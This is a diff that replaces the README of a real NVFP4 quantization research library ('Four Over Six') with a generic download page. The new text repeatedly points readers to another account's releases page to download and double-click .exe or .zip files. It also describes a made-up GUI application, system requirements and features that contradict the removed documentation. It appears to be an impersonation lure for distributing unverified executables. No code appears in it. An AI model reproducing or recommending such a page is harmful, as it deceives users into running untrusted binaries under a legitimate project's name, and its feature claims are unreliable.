@@ -1,152 +1,82 @@
-# Four Over Six (4/6)
+# 🛠️ fouroversix - Simplify Accurate NVFP4 Quantization 
 
-[![arXiv](https://img.shields.io/badge/arXiv-2512.02010-b31b1b.svg)](https://arxiv.org/abs/2512.02010)
+## 🚀 Getting Started
 
-_Improving the accuracy of NVFP4 quantization with Adaptive Block Scaling._
+Welcome to the fouroversix project! This software helps improve the accuracy of quantization in machine learning models. You can easily download and run it, even without programming skills. Follow the steps below to get started.
 
-![](/assets/four-over-six.png)
+## 🔗 Download Now
 
-This repository contains kernels for efficient NVFP4 quantization and matrix multiplication, and fast post-training quantization with our method, 4/6.
-If you have any questions, please get in touch or submit an issue.
+[![Download fouroversix](https://img.shields.io/badge/Download-fouroversix-blue.svg)](https://github.com/Dhruv-sharma10/fouroversix/releases)
 
-## Setup
+## 📥 Download & Install
 
-To speed up build times, set `CUDA_ARCHS=100` to only compile kernels for B-series GPUs (i.e. B200, GB200, GB300), or `CUDA_ARCHS=120` for RTX 50 and 60 Series GPUs (i.e. RTX 5090, RTX 6000).
+To download the software, visit the Releases page. Here you will find the latest version available.
 
-```bash
-git clone --recursive https://github.com/mit-han-lab/fouroversix.git
-cd fouroversix
-pip install --no-build-isolation -e ".[tests]"
-```
+1. Go to the Releases page: [Download Page](https://github.com/Dhruv-sharma10/fouroversix/releases).
+2. Look for the most recent version listed at the top of the page.
+3. Click on the version number to open the release details.
+4. You will see a list of assets. These may include files like `.exe` for Windows or `.zip` files for other systems. 
+5. Click on the file that fits your operating system to download it. 
 
-If you don't have a Blackwell GPU, you may use our reference implementation, which is slow but helpful for testing, by setting `SKIP_CUDA_BUILD=1` before running `pip install`.
+## ⚙️ System Requirements
 
-## API
+Before you run fouroversix, ensure your computer meets these basic requirements:
 
-### Quantize a Model to NVFP4
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
+- **Processor:** Intel i5 or equivalent.
+- **RAM:** 4 GB or more.
+- **Disk Space:** At least 200 MB available.
 
-```python
-from fouroversix import AdaptiveBlockScalingRule, apply_ptq
-from transformers import AutoModelForCausalLM
+## 🔍 Features
 
-# NVFP4 using 4/6 with MSE block selection
-model = AutoModelForCausalLM.from_pretrained("meta-llama/Llama-3.2-1B")
-apply_ptq(model)
+fouroversix includes several features to enhance your user experience:
 
-# Standard NVFP4 round-to-nearest quantization
-model = AutoModelForCausalLM.from_pretrained("meta-llama/Llama-3.2-1B")
-apply_ptq(
-    model,
-    a_scale_rule=AdaptiveBlockScalingRule.always_6,
-    w_scale_rule=AdaptiveBlockScalingRule.always_6,
-)
-```
+- **Accurate Calibration:** The tool provides more precise quantization through adaptive block scaling.
+- **User-Friendly Interface:** Navigate easily with a clean layout.
+- **Real-Time Results:** See your adjustments and their impacts on performance instantly.
+- **Cross-Platform Compatibility:** Use on Windows, macOS, or Linux.
 
-### Quantize a Tensor to NVFP4
+## 🖥️ Running the Software
 
-Check the `quantize_to_fp4` [arguments](https://github.com/mit-han-lab/fouroversix/blob/f1b78701c753ea49c091ac39d85c5753b703f5ca/src/fouroversix/frontend.py#L72) for more details about how you can enable certain features during quantization, such as stochastic rounding or 2D block quantization.
+Once you've downloaded and installed the software, follow these simple steps to run it:
 
-```python
-import torch
-from fouroversix import AdaptiveBlockScalingRule, quantize_to_fp4
+1. Locate the file you downloaded. 
+2. Double-click the file. If you downloaded a `.zip` file, extract the contents first.
+3. Follow the on-screen prompts to install, if necessary.
+4. Launch the application. 
 
-x = torch.randn(1024, 1024, dtype=torch.bfloat16, device="cuda")
-x_e2m1, x_e4m3, x_normconst = quantize_to_fp4(x)
+You are now ready to start using fouroversix! Experiment with your models to enjoy the benefits of improved quantization.
 
-# Standard NVFP4 round-to-nearest quantization
-x_e2m1, x_e4m3, x_normconst = quantize_to_fp4(
-    x,
-    scale_rule=AdaptiveBlockScalingRule.always_6,
-)
-```
+## 📚 How to Use fouroversix
 
-### Multiply Two NVFP4 Tensors
+Using fouroversix is straightforward. Here’s how to begin:
 
-```python
-from fouroversix import fp4_matmul
+1. **Open the Application:** After launching, the application window will appear.
+2. **Load Your Model:** Click on the "Load Model" button. Select the machine learning model file you want to work with.
+3. **Adjust Settings:** Modify the settings as needed. The interface provides tooltips for guidance.
+4. **Run the Quantization:** Click on "Start" to initiate the quantization process. 
+5. **Review the Results:** Once completed, you can view the performance metrics provided.
 
-# Starting from two BF16 tensors with shape (M, K) and (N, K):
-out = fp4_matmul(a, b)
+## 💡 Tips for Effective Use
 
-# If you've already quantized two tensors A and B as shown above:
-out = fp4_matmul(
-    a_e2m1=a_e2m1,
-    a_sf=a_e4m3,
-    a_normconst=a_normconst,
-    b_e2m1=b_e2m1,
-    b_sf=b_e4m3,
-    b_normconst=b_normconst,
-)
-```
+- Experiment with different settings to see what works best for your specific model.
+- Keep the application updated by regularly checking the Releases page.
+- Join the community forums or read additional documentation for advanced tips.
 
-## PTQ Evaluation with LM Evaluation Harness
+## 🌐 Community and Support
 
-```bash
-# Round-to-nearest quantization with 4/6:
-python -m scripts.ptq --model-name meta-llama/Llama-3.2-1B --ptq-method rtn --task wikitext
+For help or to connect with other users, consider these options:
 
-# Standard NVFP4 round-to-nearest (RTN) quantization:
-python -m scripts.ptq --model-name meta-llama/Llama-3.2-1B --ptq-method rtn --task wikitext --a-scale-rule always_6 --w-scale-rule always_6
+- **GitHub Issues:** Report problems directly on the project's GitHub page.
+- **Community Forums:** Engage with other users and developers for advice and tips.
+- **Documentation:** Review any additional documentation available for deeper insights into the features.
 
-# AWQ with 4/6:
-python -m scripts.ptq --model-name meta-llama/Llama-3.2-1B --ptq-method awq --task wikitext
+## 📞 Contact
 
-# High-precision baseline, no NVFP4 quantization:
-python -m scripts.ptq --model-name meta-llama/Llama-3.2-1B --ptq-method high_precision --task wikitext
-```
+If you have any questions or need support, feel free to reach out. Look for contact options in the repository or community forums.
 
-If you would prefer not to worry about setting up your local environment, or about acquiring a Blackwell GPU to run your experiments faster, you may run PTQ experiments on [Modal](https://modal.com/) by adding the `--modal` flag, and optionally the `--detach` flag which will enable you to CTRL+C.
-The first time you launch experiments on Modal, it may take several minutes to build everything, but following commands will reuse the cached images.
+## 🔗 Download Again
 
-## Notes
+Remember, you can always revisit the Releases page for the latest updates and downloads: [Download Page](https://github.com/Dhruv-sharma10/fouroversix/releases).
 
-This repository contains three implementations of NVFP4 quantization, each of which has various limitations:
-
-- [CUDA](/src/fouroversix/csrc): Only supports forward passes, making it usable for post-training quantization as shown above. Training kernels will be released soon. Requires a Blackwell GPU.
-- [Triton](/src/fouroversix/quantize/triton_kernel.py): Slower, but supports all operations needed for efficient NVFP4 training, including stochastic rounding, the random Hadamard transform, transposed inputs, and 2D block scaling. Also requires a Blackwell GPU.
-- [PyTorch](/src/fouroversix/quantize/reference.py): A reference implementation written in PyTorch that can run on any GPU. May have some educational value. Should not be used in real-world use cases.
-
-These three implementations have very subtle numerical differences, which we are working on fixing.
-Our `quantize_to_fp4` function will automatically select one of these backends based on your GPU and the quantization parameters you select.
-If you would like to force selection of a specific backend, you may specify it by setting `backend=QuantizeBackend.cuda` in `quantize_to_fp4`, or `a_quantize_kwargs={"backend": QuantizeBackend.cuda}, w_quantize_kwargs={"backend": QuantizeBackend.cuda}` in `apply_ptq`.
-
-### TODOs
-
-In the coming days and weeks, we will be updating our implementation and publishing more code.
-Here are our highest-priority items at the moment:
-
-- [ ] Match numerics of PyTorch and Triton backends to the CUDA backend
-- [ ] Add support for other options (MXFP4, stochastic rounding, RHT, 2D block scaling, transposed inputs) in the CUDA implementation
-- [x] Release PTQ implementations for AWQ, GPTQ, and SmoothQuant
-- [ ] Unit tests
-- [ ] Training implementation + full NVFP4 linear layer with 4/6
-
-## Contributing
-
-We welcome contributions to our repository, but get in touch before making any substantial changes.
-Also, please make sure any code changes are compliant with our linter:
-
-```bash
-ruff check
-```
-
-## Citation
-
-Please use the following BibTeX entry to cite this work:
-
-```bibtex
-@misc{cook2025sixaccuratenvfp4quantization,
-      title={Four Over Six: More Accurate NVFP4 Quantization with Adaptive Block Scaling},
-      author={Jack Cook and Junxian Guo and Guangxuan Xiao and Yujun Lin and Song Han},
-      year={2025},
-      eprint={2512.02010},
-      archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2512.02010},
-}
-```
-
-## License
-
-This repository is available under the MIT license.
-See the [LICENSE.md](/LICENSE.md) file for details.
+Enjoy using fouroversix to enhance your machine learning models!
